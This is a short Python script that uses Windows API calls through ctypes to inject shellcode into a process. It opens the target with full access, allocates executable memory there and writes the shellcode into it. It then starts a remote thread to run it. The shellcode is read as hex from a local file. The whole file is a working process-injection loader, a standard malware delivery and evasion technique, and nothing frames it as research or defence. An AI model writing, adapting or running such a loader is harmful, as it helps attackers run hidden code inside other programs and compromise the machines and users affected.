import ctypes


def inject_shellcode(shellcode, target_pid=None):
    if target_pid:
        process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, target_pid)
    else:
        process_handle = ctypes.windll.kernel32.GetCurrentProcess()

    ctypes.windll.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
    shellcode_address = ctypes.windll.kernel32.VirtualAllocEx(
        ctypes.c_void_p(process_handle),
        0,
        len(shellcode),
        0x1000 | 0x2000,
        0x40
    )

    written = ctypes.c_ulong(0)
    ctypes.windll.kernel32.WriteProcessMemory(
        ctypes.c_void_p(process_handle),
        ctypes.c_void_p(shellcode_address),
        shellcode,
        len(shellcode),
        ctypes.byref(written)
    )

    thread_id = ctypes.c_ulong(0)
    ctypes.windll.kernel32.CreateRemoteThread(
        ctypes.c_void_p(process_handle),
        None,
        0,
        ctypes.c_void_p(shellcode_address),
        None,
        0,
        ctypes.byref(thread_id)
    )

    ctypes.windll.kernel32.CloseHandle(process_handle)


with open('shellcode.txt') as f:
    data = f.read()
print(data)
inject_shellcode(bytes.fromhex(data))
input()
